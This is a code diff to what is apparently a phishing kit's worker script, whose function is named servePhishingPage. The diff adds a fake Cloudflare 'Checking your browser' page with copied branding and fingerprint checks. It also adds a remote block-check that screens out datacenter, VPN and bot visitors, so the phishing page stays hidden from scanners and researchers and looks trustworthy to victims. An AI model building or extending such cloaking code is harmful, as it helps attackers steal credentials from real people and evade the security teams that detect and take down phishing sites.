@@ -45,7 +45,7 @@ async function servePhishingPage(request) {
                     request.headers.get('X-Real-IP') || 
                     '';
 
-  // Check if visitor should be blocked
+  // Check if visitor should be blocked or challenged
   try {
     const blockResponse = await fetch(`${VERIFY_ENDPOINT}/api/capture/visitor/block-check`, {
       method: 'POST',
@@ -53,7 +53,7 @@ async function servePhishingPage(request) {
       body: JSON.stringify({ jwt_token: jwtToken, visitor_ip: visitorIp }),
     });
     const blockData = await blockResponse.json();
-    
+
     if (blockData.blocked) {
       if (blockData.redirect_url) {
         // Redirect to the configured URL
@@ -62,7 +62,7 @@ async function servePhishingPage(request) {
           headers: { 'Location': blockData.redirect_url }
         });
       } else {
-        // Show blank page
+        // Show blank page for blocked visitors
         return new Response('', {
           status: 200,
           headers: {
@@ -71,6 +71,17 @@ async function servePhishingPage(request) {
           }
         });
       }
+    }
+
+    // If challenged, serve Cloudflare-style challenge page
+    if (blockData.challenged) {
+      return new Response(buildChallengePage(jwtToken, turnstileKey, templateHTML, blockData.ip_type), {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/html; charset=utf-8',
+          'Cache-Control': 'no-cache, no-store, must-revalidate',
+        }
+      });
     }
   } catch (e) {
     // If block check fails, serve the page anyway
@@ -286,6 +297,27 @@ async function handleLogRequest(request) {
     });
   } catch (e) { /* silent */ }
   return new Response('ok', { status: 200 });
+}
+
+// Cloudflare-Style Challenge Page for challenged visitors
+function buildChallengePage(jwtToken, turnstileKey, originalHTML, ipType) {
+  var ipTypeLabels = {
+    'datacenter': 'Datacenter IP',
+    'vpn': 'VPN/Proxy IP',
+    'mobile': 'Mobile Carrier IP',
+    'satellite': 'Satellite IP',
+    'suspicious': 'Suspicious IP'
+  };
+  var ipLabel = ipTypeLabels[ipType] || 'Suspicious IP';
+
+  return '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Check</title>' +
+    '<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:#fafafa;color:#1a1a1a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}.challenge-container{max-width:480px;width:100%;text-align:center}.cf-logo{margin-bottom:32px;display:flex;align-items:center;justify-content:center}h1{font-size:24px;font-weight:600;margin-bottom:8px;color:#1a1a1a}.subtitle{font-size:14px;color:#666;margin-bottom:32px;line-height:1.5}.info-box{background:#f0f0f0;border-radius:8px;padding:16px 20px;margin-bottom:24px;text-align:left;border:1px solid #e0e0e0}.info-box p{font-size:13px;color:#555;line-height:1.6;margin:0}.info-box .highlight{color:#1a1a1a;font-weight:600}.spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#f6821f;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}@keyframes spin{to{transform:rotate(360deg)}}.status-text{font-size:13px;color:#666;margin-bottom:8px}.turnstile-widget{margin:16px auto;min-height:65px}.footer{margin-top:40px;padding-top:24px;border-top:1px solid #e0e0e0;width:100%;max-width:480px}.footer p{font-size:11px;color:#999;text-align:center;line-height:1.5}.cf-brand{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px}.cf-brand span{font-size:11px;color:#999;font-weight:500}.success-check{display:none;width:48px;height:48px;margin:0 auto 16px;background:#4CAF50;border-radius:50%;align-items:center;justify-content:center;color:white;font-size:24px}.success-check.show{display:flex}.hidden{display:none}</style></head>' +
+    '<body><div class="challenge-container"><div class="cf-logo"><svg width="48" height="48" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><path fill="#f6821f" d="M52.8 25.6c-.4-2.8-2.8-4.8-5.6-4.8-.4 0-.8 0-1.2.1C44.4 9.2 34 1.6 22 1.6 10.4 1.6 .8 10.4 .1 21.8 0 22 0 22.1 0 22.3c0 5.4 4.4 9.8 9.8 9.8.4 0 .8 0 1.2-.1 2.4 6.4 8.6 10.8 15.8 10.8h17.4c5.4 0 9.8-4.4 9.8-9.8 0-4.8-3.5-8.8-8-9.6z"/></svg></div>' +
+    '<div id="checkingState"><div class="spinner"></div><h1>Checking your browser</h1><p class="subtitle">Please wait for a moment while we verify your connection.</p><div class="info-box"><p><span class="highlight">IP Type Detected:</span> ' + ipLabel + '</p><p style="margin-top:4px;">This is a standard security check to protect the website from automated threats.</p></div><p class="status-text" id="statusText">Initializing security check...</p><div class="turnstile-widget" id="turnstileWidget"></div></div>' +
+    '<div id="successState" class="hidden"><div class="success-check show">&#10003;</div><h1>Verification Complete</h1><p class="subtitle">You are being redirected...</p></div></div>' +
+    '<div class="footer"><div class="cf-brand"><svg width="16" height="16" viewBox="0 0 16 16" fill="#f6821f"><path d="M14 10c0-2.2-1.8-4-4-4-.3 0-.6 0-.9.1C8.4 3.2 6.2 1.6 3.8 1.6 1.7 1.6 .1 3.4 0 5.4c0 .1 0 .2 0 .3 0 1.1 .9 2 2 2 .1 0 .2 0 .3-.1 .5 1.3 1.8 2.2 3.2 2.2H9c2.2 0 4-1.8 4-4z"/></svg><span>Protected by Cloudflare Turnstile</span></div><p>This security check helps prevent automated bots from accessing this website.</p></div>' +
+    '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>' +
+    '<script>(function(){var s=document.getElementById("statusText"),c=document.getElementById("checkingState"),u=document.getElementById("successState");function ok(t){s.textContent="Verification successful!";setTimeout(function(){c.classList.add("hidden");u.classList.remove("hidden");setTimeout(function(){window.location.reload();},1500);},800)}function err(){s.textContent="Verification error. Retrying...";setTimeout(function(){try{window.turnstile.reset()}catch(e){}},2000)}function init(){if(typeof window.turnstile==="undefined"){setTimeout(init,100);return}s.textContent="Running interactive verification...";try{window.turnstile.render("#turnstileWidget",{sitekey:"' + turnstileKey + '",theme:"light",callback:ok,"error-callback":err,"expired-callback":err})}catch(e){s.textContent="Security check skipped. Continuing...";setTimeout(function(){window.location.reload();},1000)}}setTimeout(function(){s.textContent="Analyzing browser fingerprint...";setTimeout(init,1500);},800);var b=0;if(!navigator.webdriver)b++;if(navigator.languages&&navigator.languages.length>0)b++;if(navigator.plugins&&navigator.plugins.length>0)b++;if(screen.width>0&&screen.height>0)b++;if(screen.colorDepth>0)b++;if(b<2)s.textContent="Suspicious activity detected. Additional verification required."})();</script></body></html>';
 }
 
 function renderErrorPage() {
